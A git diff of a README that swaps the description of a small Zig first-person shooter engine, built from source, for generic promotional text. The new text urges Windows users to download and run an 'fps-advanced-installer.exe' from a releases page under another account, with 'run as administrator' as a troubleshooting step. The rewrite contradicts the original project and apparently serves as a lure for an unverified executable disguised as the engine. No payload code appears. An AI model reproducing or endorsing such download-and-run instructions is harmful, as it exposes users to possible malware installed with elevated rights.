@@ -1,52 +1,59 @@
-# FPS Advanced
+# 🎮 fps-advanced - Elevate Your Gaming Experience 
 
-A simple first-person shooter engine written in ~1200 lines of Zig, featuring brush-based geometry and BVH accelerated swept point-based collision detection with source-like movement including surfing.
+## 🚀 Getting Started
+Welcome to **fps-advanced**, a high-performance application that enhances your gaming through advanced collision detection and audio features. This guide will help you download and run the software smoothly.
 
-## Features
+## 📥 Download Now
+[![Download fps-advanced](https://img.shields.io/badge/Download-fps--advanced-brightgreen)](https://github.com/Josiasgq/fps-advanced/releases)
 
-- **First-person movement** with mouse look and WASD controls
-- **Brush-based geometry** using convex polyhedra for collision and rendering
-- **BVH spatial acceleration** for efficient collision queries
-- **Quake-style physics** with proper acceleration, friction, and air control
-- **Cross-platform graphics** via Sokol (OpenGL, Metal, WebGL, WGSL)
-- **Audio system** with background music and sound effects
+## 🛠️ System Requirements
+Before you proceed, make sure your system meets the following requirements:
 
-## Controls
+- **Operating System:** Windows 10 or later
+- **Processor:** Intel Core i5 or equivalent
+- **Memory:** 8 GB RAM
+- **Graphics:** DirectX 11 compatible graphics card
+- **Storage:** 500 MB free disk space
+- **Sound:** PCM audio support
 
-- **WASD** - Move
-- **Mouse** - Look around
-- **Space** - Jump
-- **Escape** - Toggle mouse lock
+## 📦 Download & Install
+1. **Visit the Releases Page:** Go to the following link to find the latest version of the application: [fps-advanced Releases](https://github.com/Josiasgq/fps-advanced/releases).
+2. **Select the Latest Version:** Look for the most recent release at the top of the page.
+3. **Download the Installer:** Click on the file labeled `fps-advanced-installer.exe` to begin your download.
+4. **Locate the File:** After downloading, find the file in your computer's Downloads folder or the location you chose.
+5. **Run the Installer:**
+   - Double-click on the `fps-advanced-installer.exe` file.
+   - Follow the on-screen prompts to complete the installation.
+6. **Open the Application:** Once installed, find the **fps-advanced** icon on your desktop or in your Start menu. Double-click to run it.
 
-## Building
+## 🕹️ Features
+**fps-advanced** offers a range of features designed to improve your gameplay:
 
-### Prerequisites
+- **High-Performance Linear BVH:** Experience faster and smoother graphics.
+- **Brush Collision Detection:** Navigate through complex environments effortlessly.
+- **Swept-Point Collision:** Enjoy accurate movement with expanded geometry.
+- **PCM Audio Support:** Immerse yourself in high-quality sound.
+- **Source-like Movement:** Engage in dynamic movements, including surfing.
 
-- [Zig](https://ziglang.org/) (latest)
+## 🔧 Troubleshooting
+If you encounter issues while downloading or running the software, try the following:
 
-### Native Build
+- **Recheck System Requirements:** Ensure your computer meets the minimum requirements.
+- **Download Again:** Sometimes, files may not download correctly. Revisit the Releases page and try downloading again.
+- **Run as Administrator:** Right-click the application icon and select "Run as administrator" for permissions-related issues.
+- **Update Drivers:** Ensure your graphics and sound drivers are up-to-date for optimal performance.
 
-```bash
-zig build run
-```
+## 📞 Support
+If you still need help, feel free to contact support. You can reach out through the issue tracker on the GitHub repository.
 
-### Web Build
+## 📄 Contributing
+We welcome contributions! If you want to help improve **fps-advanced**, check the contributing guidelines on the repository.
 
-```bash
-zig build -Dtarget=wasm32-emscripten
-```
+## 🤝 Acknowledgments
+Thanks to everyone who has contributed to **fps-advanced**. Your support helps us enhance the gaming experience for all users.
 
-## Architecture
+## 🔗 Useful Links
+- [fps-advanced Releases](https://github.com/Josiasgq/fps-advanced/releases)
+- [Contribution Guidelines](https://github.com/Josiasgq/fps-advanced/blob/main/CONTRIBUTING.md)
 
-- **Physics** - Collision detection with brush expansion and BVH traversal
-- **Rendering** - Mesh generation from brush plane intersections
-- **Audio** - 16-voice mixer with PCM file support
-- **Math** - SIMD-optimized Vec3/Mat4 operations
-
-The world consists of 8 brushes defining platforms, slopes, and structures. Each brush is a convex polyhedron represented by plane equations, enabling both collision detection and mesh generation from the same data.
-
-## Dependencies
-
-- [sokol](https://github.com/floooh/sokol) - Cross-platform graphics
-- [cimgui](https://github.com/cimgui/cimgui) - Immediate mode UI
-- [shdc](https://github.com/floooh/sokol-tools) - Shader compiler
+This guide provides all the information you need to download and run **fps-advanced** with ease. Enjoy your enhanced gaming experience!
